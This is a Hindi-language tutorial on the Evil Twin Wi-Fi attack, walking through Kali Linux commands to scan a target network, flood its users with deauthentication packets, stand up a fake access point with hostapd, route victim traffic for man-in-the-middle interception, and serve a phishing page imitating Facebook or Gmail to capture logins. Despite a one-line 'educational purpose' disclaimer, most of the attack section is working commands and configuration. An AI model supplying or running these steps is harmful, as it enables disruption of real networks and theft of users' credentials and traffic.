
# 🛠️ Evil Twin Attack (हिंदी गाइड)

## 📌 Evil Twin क्या है?
Evil Twin एक Wi-Fi hacking technique है, जिसमें attacker एक fake Wi-Fi Access Point (AP) बनाता है, 
जो दिखने में असली नेटवर्क जैसा होता है। यूज़र गलती से इससे connect हो जाते हैं और attacker उनके 
credentials, traffic और data capture कर लेता है।

---

## 🔍 Evil Twin कैसे काम करता है?
1. **Target Network Scan** – पहले असली Wi-Fi network की जानकारी निकाली जाती है (SSID, BSSID, Channel)  
2. **Fake Access Point बनाना** – उसी SSID से एक नकली Wi-Fi hotspot बनाया जाता है  
3. **Deauthentication Attack** – असली नेटवर्क के यूज़र्स को disconnect किया जाता है  
4. **User Connect करता है** – यूज़र गलती से नकली AP से connect हो जाते हैं  
5. **Data Capture / Phishing** – Login पेज दिखाकर credentials चुराए जाते हैं या traffic sniff किया जाता है  

---

## 🧪 Evil Twin + MITM Attack
अगर fake AP में इंटरनेट access दिया जाए, तो attacker victim का सारा traffic capture कर सकता है और 
Man-in-the-Middle (MITM) attack चला सकता है।

उदाहरण:  
- HTTP sites से passwords capture करना  
- HTTPS sites पर SSL stripping  
- Session hijacking  

---

## 🎯 Evil Twin + Phishing Page
इसमें fake login पेज host किया जाता है (उदाहरण: Facebook, Gmail)  
जब victim connect करता है और कोई भी page खोलने की कोशिश करता है, तो उसको fake login page redirect किया जाता है।
Victim जैसे ही credentials डालता है, वो attacker के पास save हो जाते हैं।

---

## 🛠️ Setup in Kali Linux

### 1. जरूरी Tools Install करें
```bash
sudo apt update
sudo apt install aircrack-ng hostapd dnsmasq apache2 php
```

### 2. Target Network Scan
```bash
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon
```
📌 Note: यहाँ से SSID, BSSID, और channel note करें।

### 3. Deauthentication Attack
```bash
sudo aireplay-ng --deauth 10 -a <BSSID> wlan0mon
```

### 4. Fake AP बनाना (hostapd.conf)
```conf
interface=wlan0
driver=nl80211
ssid=My_Free_WiFi
hw_mode=g
channel=6
macaddr_acl=0
ignore_broadcast_ssid=0
```
Run:
```bash
sudo hostapd hostapd.conf
```

### 5. Internet / MITM Setup
```bash
sudo dnsmasq -C dnsmasq.conf
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```

### 6. Phishing Page Setup
```bash
sudo service apache2 start
sudo cp -r phishing_page/* /var/www/html/
```

---

## ⚠️ Legal Disclaimer
यह tutorial सिर्फ **educational purpose** के लिए है। किसी भी unauthorized network पर hacking illegal है।

---

## 📂 Practice Download
[Evil Twin Lab Demo Download करें](sandbox:/mnt/data/evil_twin_lab_demo.zip)
